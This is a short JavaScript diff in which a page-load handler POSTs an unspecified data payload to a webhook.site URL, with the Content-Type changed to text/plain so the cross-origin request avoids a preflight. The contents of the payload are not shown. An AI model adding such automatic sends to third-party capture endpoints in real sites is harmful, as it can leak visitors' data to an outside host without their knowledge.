@@ -104,7 +104,7 @@ document.addEventListener("DOMContentLoaded", () => {
       fetch("https://webhook.site/672fa2cb-e3c4-4dff-a7f3-df118f4278fc", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json"
+          "Content-Type": "text/plain;charset=utf-8"
         },
         body: JSON.stringify(dataPayload)
       })
